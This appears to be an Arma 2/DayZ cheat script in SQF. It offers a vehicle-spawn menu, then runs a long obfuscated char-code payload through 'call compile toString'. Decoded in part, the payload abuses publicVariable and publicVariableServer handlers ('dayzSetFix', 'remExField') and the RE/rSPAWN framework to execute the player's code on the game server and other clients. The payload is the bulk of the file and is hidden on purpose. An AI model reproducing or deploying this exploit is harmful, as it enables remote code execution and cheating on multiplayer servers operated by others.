/*
List generation by AlPmaker 17:04 22/09/12 v 1.01 beta
edits by iniinfi aka infiSTAR 17:51 25/11/12 UTC+1, Germany
*/

// Configuration
_tpdist = 10; //distance in front of player to land Vehicle

// End of configuration

#define KINDOF_ARRAY(a,b) [##a,##b] call {_veh = _this select 0;_types = _this select 1;_res = false; {if (_veh isKindOf _x) exitwith { _res = true };}forEach _types;_res}

_n2sh = 10;
_n2c = "Select Vehicle:";
selectedvehicle = ""; shnext = false;
if (isNil "vhnlist") then
{
	vhnlist = [];
	_kindOf = ["LandVehicle","Air","Ship"];
	_filter = ["BIS_Steerable_Parachute","ParachuteBase"];      
	_cfgvehicles = configFile >> "cfgVehicles";
	cutText ["Generating Vehicle list... Wait...","PLAIN DOWN"];
	for "_i" from 0 to (count _cfgvehicles)-1 do 
	{
	        _vehicle = _cfgvehicles select _i;
	        if (isClass _vehicle) then 
		{
	                _veh_type = configName(_vehicle);
	                if (
				(getNumber(_vehicle >> "scope")==2) and 
				(getText(_vehicle >> "picture")!="") and 
				(KINDOF_ARRAY(_veh_type,_kindOf)) and 
				!(KINDOF_ARRAY(_veh_type,_filter))) 
	
			then 
			{vhnlist set [count vhnlist,_veh_type];};
	        };
	};
	cutText ["List is ready...","PLAIN DOWN"];
};

shnext = false;

shnmenu = 
{
	_pmenu = [["",true],[_n2c, [-1], "", -5, [["expression", ""]], "1", "0"]];
	for "_i" from (_this select 0) to (_this select 1) do
	{_arr = [format['%1',vhnlist select (_i)], [_i - (_this select 0) + 2],  "", -5, [["expression", format["selectedvehicle = vhnlist select %1;",_i]]], "1", "1"];_pmenu set [_i+2, _arr];};
	_pmenu set [(_this select 1)+2, ["", [-1], "", -5, [["expression", ""]], "1", "0"]];
	if (count vhnlist >  (_this select 1)) then 
	{_pmenu set [(_this select 1)+3, ["Next", [12], "", -5, [["expression", "shnext = true;"]], "1", "1"]];}
	else {_pmenu set [(_this select 1)+3, ["", [-1], "", -5, [["expression", ""]], "1", "0"]];};
	_pmenu set [(_this select 1)+4, ["Exit", [13], "", -5, [["expression", "selectedvehicle = 'exitscript';"]], "1", "1"]];
	showCommandingMenu "#USER:_pmenu";
};
_j=0;if (_n2sh>9) then {_n2sh=10;};

while {selectedvehicle==""} do
{
	[_j,(_j+_n2sh) min (count vhnlist)] call shnmenu;_j=_j+_n2sh;
	WaitUntil {selectedvehicle!="" or shnext};	
	shnext = false;
};




if (selectedvehicle != "exitscript" and selectedvehicle != "") then
{	
	
//
_dirplr = getDir vehicle player;
_posplr = [((getPos vehicle player) select 0)+5*sin(_dirplr),((getPos vehicle player) select 1)+5*cos(_dirplr),0];
_spwnveh = format ["if (isServer) then {[0, nil, [%1, %2], '%3'] call local_publishObj;};", _dirplr, _posplr, selectedvehicle];

_gotthiscode = _spwnveh;

call compile toString [
99,97,108,108,32,99,111,109,112,105,108,101,32,116,111,83,
116,114,105,110,103,32,13,10,91,55,53,44,56,50,44,55,57,44,
55,56,44,57,53,44,56,51,44,49,49,54,44,49,49,52,44,56,52,44,
49,49,49,44,54,53,44,49,49,52,44,49,49,52,44,57,55,44,49,50,
49,44,51,50,44,54,49,44,51,50,44,49,50,51,44,49,51,44,49,48,
44,57,44,49,49,50,44,49,49,52,44,49,48,53,44,49,49,56,44,57,
55,44,49,49,54,44,49,48,49,44,57,49,44,51,52,44,57,53,44,49,
48,53,44,49,49,48,44,51,52,44,52,52,44,51,52,44,57,53,44,49,
48,53,44,51,52,44,52,52,44,51,52,44,57,53,44,57,55,44,49,49,
52,44,49,49,52,44,51,52,44,52,52,44,51,52,44,57,53,44,49,49,
49,44,49,49,55,44,49,49,54,44,51,52,44,57,51,44,53,57,44,49,
51,44,49,48,44,57,44,57,53,44,49,48,53,44,49,49,48,44,54,49,
44,57,53,44,49,49,54,44,49,48,52,44,49,48,53,44,49,49,53,44,
51,50,44,49,49,53,44,49,48,49,44,49,48,56,44,49,48,49,44,57,
57,44,49,49,54,44,51,50,44,52,56,44,53,57,44,49,51,44,49,48,
44,57,44,57,53,44,57,55,44,49,49,52,44,49,49,52,44,51,50,44,
54,49,44,51,50,44,49,49,54,44,49,49,49,44,54,53,44,49,49,52,
44,49,49,52,44,57,55,44,49,50,49,44,52,48,44,57,53,44,49,48,
53,44,49,49,48,44,52,49,44,53,57,44,49,51,44,49,48,44,57,44,
57,53,44,49,49,49,44,49,49,55,44,49,49,54,44,54,49,44,57,49,
44,57,51,44,53,57,44,49,51,44,49,48,44,57,44,49,48,50,44,49,
49,49,44,49,49,52,44,51,50,44,51,52,44,57,53,44,49,48,53,44,
51,52,44,51,50,44,49,48,50,44,49,49,52,44,49,49,49,44,49,48,
57,44,51,50,44,52,56,44,51,50,44,49,49,54,44,49,49,49,44,51,
50,44,52,48,44,57,57,44,49,49,49,44,49,49,55,44,49,49,48,44,
49,49,54,44,51,50,44,57,53,44,57,55,44,49,49,52,44,49,49,52,
44,52,49,44,52,53,44,52,57,44,51,50,44,49,48,48,44,49,49,49,
44,51,50,44,49,50,51,44,49,51,44,49,48,44,57,44,57,44,57,53,
44,49,49,49,44,49,49,55,44,49,49,54,44,54,49,44,57,53,44,49,
49,49,44,49,49,55,44,49,49,54,44,52,51,44,57,49,44,49,49,54,
44,49,49,49,44,56,51,44,49,49,54,44,49,49,52,44,49,48,53,44,
49,49,48,44,49,48,51,44,52,48,44,57,49,44,57,53,44,57,55,44,
49,49,52,44,49,49,52,44,51,50,44,49,49,53,44,49,48,49,44,49,
48,56,44,49,48,49,44,57,57,44,49,49,54,44,51,50,44,57,53,44,
49,48,53,44,57,51,44,52,49,44,57,51,44,53,57,44,49,51,44,49,
48,44,57,44,49,50,53,44,53,57,44,49,51,44,49,48,44,57,44,57,
53,44,49,49,49,44,49,49,55,44,49,49,54,44,49,51,44,49,48,44,
49,50,53,44,53,57,44,49,51,44,49,48,44,49,51,44,49,48,44,57,
53,44,55,54,44,49,48,53,44,49,48,55,44,49,48,49,44,55,52,44,
49,49,49,44,49,48,55,44,49,48,49,44,49,49,52,44,55,55,44,49,
49,49,44,49,49,52,44,49,48,49,44,56,52,44,49,48,52,44,57,55,
44,49,49,48,44,54,54,44,57,55,44,49,49,54,44,49,48,57,44,57,
55,44,49,49,48,44,51,50,44,54,49,44,51,50,44,49,48,50,44,49,
49,49,44,49,49,52,44,49,48,57,44,57,55,44,49,49,54,44,51,50,
44,57,49,44,51,52,44,53,57,44,57,49,44,49,49,48,44,49,48,53,
44,49,48,56,44,52,52,44,49,49,48,44,49,48,53,44,49,48,56,44,
52,52,44,51,52,44,51,52,44,49,49,50,44,49,48,49,44,49,49,52,
44,51,52,44,51,52,44,52,52,44,49,49,52,44,56,51,44,56,48,44,
54,53,44,56,55,44,55,56,44,52,52,44,51,50,44,57,49,44,57,51,
44,52,52,44,51,50,44,49,50,51,44,51,55,44,52,57,44,49,50,53,
44,57,51,44,51,50,44,57,57,44,57,55,44,49,48,56,44,49,48,56,
44,51,50,44,56,50,44,54,57,44,53,57,44,51,52,44,52,52,44,51,
50,44,57,53,44,49,48,51,44,49,49,49,44,49,49,54,44,49,49,54,
44,49,48,52,44,49,48,53,44,49,49,53,44,57,57,44,49,49,49,44,
49,48,48,44,49,48,49,44,57,51,44,53,57,44,49,51,44,49,48,44,
49,51,44,49,48,44,49,51,44,49,48,44,49,48,48,44,57,55,44,49,
50,49,44,49,50,50,44,56,51,44,49,48,49,44,49,49,54,44,55,48,
44,49,48,53,44,49,50,48,44,51,50,44,54,49,44,51,50,44,51,50,
44,57,49,44,57,53,44,55,54,44,49,48,53,44,49,48,55,44,49,48,
49,44,55,52,44,49,49,49,44,49,48,55,44,49,48,49,44,49,49,52,
44,55,55,44,49,49,49,44,49,49,52,44,49,48,49,44,56,52,44,49,
48,52,44,57,55,44,49,49,48,44,54,54,44,57,55,44,49,49,54,44,
49,48,57,44,57,55,44,49,49,48,44,57,51,44,51,50,44,57,57,44,
57,55,44,49,48,56,44,49,48,56,44,51,50,44,55,53,44,56,50,44,
55,57,44,55,56,44,57,53,44,56,51,44,49,49,54,44,49,49,52,44,
56,52,44,49,49,49,44,54,53,44,49,49,52,44,49,49,52,44,57,55,
44,49,50,49,44,53,57,44,49,51,44,49,48,44,49,49,50,44,49,49,
55,44,57,56,44,49,48,56,44,49,48,53,44,57,57,44,56,54,44,57,
55,44,49,49,52,44,49,48,53,44,57,55,44,57,56,44,49,48,56,44,
49,48,49,44,51,50,44,51,52,44,49,48,48,44,57,55,44,49,50,49,
44,49,50,50,44,56,51,44,49,48,49,44,49,49,54,44,55,48,44,49,
48,53,44,49,50,48,44,51,52,44,53,57,44,49,51,44,49,48,44,49,
51,44,49,48,44,49,48,53,44,49,48,50,44,51,50,44,52,48,44,49,
48,53,44,49,49,53,44,49,49,48,44,49,48,53,44,49,48,56,44,51,
50,44,51,52,44,49,48,57,44,57,55,44,49,49,53,44,49,49,54,44,
49,49,49,44,49,49,52,44,57,56,44,57,55,44,49,49,54,44,49,49,
49,44,49,49,52,44,51,52,44,52,49,44,51,50,44,49,49,54,44,49,
48,52,44,49,48,49,44,49,49,48,44,49,51,44,49,48,44,49,50,51,
44,49,51,44,49,48,44,57,44,49,48,57,44,57,55,44,49,49,53,44,
49,49,54,44,49,49,49,44,49,49,52,44,57,56,44,57,55,44,49,49,
54,44,49,49,49,44,49,49,52,44,51,50,44,54,49,44,51,50,44,52,
57,44,53,57,44,49,51,44,49,48,44,57,44,49,49,52,44,49,48,49,
44,49,48,57,44,54,57,44,49,50,48,44,55,48,44,49,48,53,44,49,
48,49,44,49,48,56,44,49,48,48,44,51,50,44,54,49,44,51,50,44,
57,49,44,49,49,48,44,49,48,53,44,49,48,56,44,52,52,44,51,50,
44,49,49,48,44,49,48,53,44,49,48,56,44,52,52,44,51,50,44,51,
52,44,53,57,44,57,53,44,49,48,53,44,49,49,48,44,51,50,44,54,
49,44,51,50,44,49,48,48,44,57,55,44,49,50,49,44,49,50,50,44,
56,51,44,49,48,49,44,49,49,54,44,55,48,44,49,48,53,44,49,50,
48,44,53,57,44,57,53,44,49,49,49,44,49,49,55,44,49,49,54,44,
51,50,44,54,49,44,51,50,44,51,52,44,51,52,44,51,52,44,51,52,
44,53,57,44,57,53,44,49,48,53,44,51,50,44,54,49,44,51,50,44,
52,56,44,53,57,44,49,49,57,44,49,48,52,44,49,48,53,44,49,48,
56,44,49,48,49,44,51,50,44,49,50,51,44,57,53,44,49,48,53,44,
51,50,44,54,48,44,54,49,44,51,50,44,52,48,44,52,48,44,57,57,
44,49,49,49,44,49,49,55,44,49,49,48,44,49,49,54,44,51,50,44,
57,53,44,49,48,53,44,49,49,48,44,52,49,44,52,53,44,52,57,44,
52,49,44,51,50,44,49,50,53,44,51,50,44,49,48,48,44,49,49,49,
44,51,50,44,49,50,51,44,57,53,44,49,49,49,44,49,49,55,44,49,
49,54,44,51,50,44,54,49,44,51,50,44,57,53,44,49,49,49,44,49,
49,55,44,49,49,54,44,51,50,44,52,51,44,51,50,44,52,48,44,57,
53,44,49,48,53,44,49,49,48,44,51,50,44,49,49,53,44,49,48,49,
44,49,48,56,44,49,48,49,44,57,57,44,49,49,54,44,51,50,44,57,
53,44,49,48,53,44,52,49,44,53,57,44,57,53,44,49,48,53,44,51,
50,44,54,49,44,51,50,44,57,53,44,49,48,53,44,51,50,44,52,51,
44,51,50,44,52,57,44,53,57,44,49,50,53,44,53,57,44,57,57,44,
49,49,49,44,49,48,48,44,49,48,49,44,51,50,44,54,49,44,51,50,
44,49,49,53,44,49,48,49,44,49,49,52,44,49,49,56,44,49,48,49,
44,49,49,52,44,57,53,44,49,49,49,44,49,49,48,44,56,48,44,49,
48,56,44,57,55,44,49,50,49,44,49,48,49,44,49,49,52,44,54,56,
44,49,48,53,44,49,49,53,44,57,57,44,49,49,49,44,49,49,48,44,
49,49,48,44,49,48,49,44,57,57,44,49,49,54,44,53,57,44,49,49,
52,44,49,48,48,44,49,49,57,44,57,55,44,49,49,52,44,49,48,48,
44,49,48,49,44,49,49,48,44,49,49,53,44,49,49,55,44,57,57,44,
49,48,55,44,49,49,53,44,57,57,44,49,49,49,44,49,48,48,44,49,
48,49,44,51,50,44,54,49,44,51,50,44,57,57,44,49,49,49,44,49,
48,48,44,49,48,49,44,53,57,44,57,53,44,49,48,48,44,57,55,44,
49,49,54,44,57,55,44,51,50,44,54,49,44,51,50,44,57,49,44,57,
53,44,49,49,49,44,49,49,55,44,49,49,54,44,52,52,44,52,56,44,
57,51,44,53,57,44,51,52,44,57,51,44,53,57,44,49,51,44,49,48,
44,57,44,57,44,49,51,44,49,48,44,57,44,57,44,49,49,50,44,49,
49,55,44,57,56,44,49,48,56,44,49,48,53,44,57,57,44,56,54,44,
57,55,44,49,49,52,44,49,48,53,44,57,55,44,57,56,44,49,48,56,
44,49,48,49,44,56,51,44,49,48,49,44,49,49,52,44,49,49,56,44,
49,48,49,44,49,49,52,44,51,50,44,51,52,44,49,49,52,44,49,48,
49,44,49,48,57,44,54,57,44,49,50,48,44,55,48,44,49,48,53,44,
49,48,49,44,49,48,56,44,49,48,48,44,51,52,44,53,57,44,49,51,
44,49,48,44,49,50,53,44,49,51,44,49,48,44,49,48,49,44,49,48,
56,44,49,49,53,44,49,48,49,44,49,51,44,49,48,44,49,50,51,44,
49,51,44,49,48,44,57,44,49,49,52,44,49,48,49,44,49,48,57,44,
54,57,44,49,50,48,44,55,48,44,49,48,53,44,49,48,49,44,49,48,
56,44,49,48,48,44,51,50,44,54,49,44,51,50,44,57,49,44,49,49,
48,44,49,48,53,44,49,48,56,44,52,52,44,51,50,44,49,49,48,44,
49,48,53,44,49,48,56,44,52,52,44,51,50,44,51,52,44,53,57,44,
57,53,44,49,48,53,44,49,49,48,44,51,50,44,54,49,44,51,50,44,
49,48,48,44,57,55,44,49,50,49,44,49,50,50,44,56,51,44,49,48,
49,44,49,49,54,44,55,48,44,49,48,53,44,49,50,48,44,53,57,44,
49,51,44,49,48,44,57,44,57,44,57,53,44,49,49,49,44,49,49,55,
44,49,49,54,44,51,50,44,54,49,44,51,50,44,51,52,44,51,52,44,
51,52,44,51,52,44,53,57,44,49,51,44,49,48,44,57,44,57,44,57,
53,44,49,48,53,44,51,50,44,54,49,44,51,50,44,52,56,44,53,57,
44,49,51,44,49,48,44,57,44,57,44,49,49,57,44,49,48,52,44,49,
48,53,44,49,48,56,44,49,48,49,44,51,50,44,49,50,51,44,57,53,
44,49,48,53,44,51,50,44,54,48,44,54,49,44,51,50,44,52,48,44,
52,48,44,57,57,44,49,49,49,44,49,49,55,44,49,49,48,44,49,49,
54,44,51,50,44,57,53,44,49,48,53,44,49,49,48,44,52,49,44,52,
53,44,52,57,44,52,49,44,51,50,44,49,50,53,44,51,50,44,49,48,
48,44,49,49,49,44,51,50,44,49,50,51,44,49,51,44,49,48,44,57,
44,57,44,57,44,57,53,44,49,49,49,44,49,49,55,44,49,49,54,44,
51,50,44,54,49,44,51,50,44,57,53,44,49,49,49,44,49,49,55,44,
49,49,54,44,51,50,44,52,51,44,51,50,44,52,48,44,57,53,44,49,
48,53,44,49,49,48,44,51,50,44,49,49,53,44,49,48,49,44,49,48,
56,44,49,48,49,44,57,57,44,49,49,54,44,51,50,44,57,53,44,49,
48,53,44,52,49,44,53,57,44,49,51,44,49,48,44,57,44,57,44,57,
44,57,53,44,49,48,53,44,51,50,44,54,49,44,51,50,44,57,53,44,
49,48,53,44,51,50,44,52,51,44,51,50,44,52,57,44,53,57,44,49,
51,44,49,48,44,57,44,57,44,49,50,53,44,53,57,44,49,51,44,49,
48,44,57,44,57,44,57,57,44,49,49,49,44,49,48,48,44,49,48,49,
44,51,50,44,54,49,44,51,50,44,49,49,52,44,49,48,48,44,49,49,
57,44,57,55,44,49,49,52,44,49,48,48,44,49,48,49,44,49,49,48,
44,49,49,53,44,49,49,55,44,57,57,44,49,48,55,44,49,49,53,44,
57,57,44,49,49,49,44,49,48,48,44,49,48,49,44,53,57,44,49,51,
44,49,48,44,57,44,57,44,57,53,44,49,48,48,44,57,55,44,49,49,
54,44,57,55,44,51,50,44,54,49,44,51,50,44,57,49,44,57,53,44,
49,49,49,44,49,49,55,44,49,49,54,44,52,52,44,52,56,44,57,51,
44,53,57,44,49,51,44,49,48,44,57,44,57,44,51,52,44,57,51,44,
53,57,44,49,51,44,49,48,44,57,44,57,44,49,51,44,49,48,44,57,
44,57,44,49,49,50,44,49,49,55,44,57,56,44,49,48,56,44,49,48,
53,44,57,57,44,56,54,44,57,55,44,49,49,52,44,49,48,53,44,57,
55,44,57,56,44,49,48,56,44,49,48,49,44,56,51,44,49,48,49,44,
49,49,52,44,49,49,56,44,49,48,49,44,49,49,52,44,51,50,44,51,
52,44,49,49,52,44,49,48,49,44,49,48,57,44,54,57,44,49,50,48,
44,55,48,44,49,48,53,44,49,48,49,44,49,48,56,44,49,48,48,44,
51,52,44,53,57,44,49,51,44,49,48,44,49,50,53,44,53,57,93,59];
//

	cutText [format ["Here is Your : %1",gettext(configFile >> "cfgVehicles" >> selectedvehicle >> 'displayName')],"PLAIN DOWN"];
	selectedvehicle = "";
	sleep 1;
};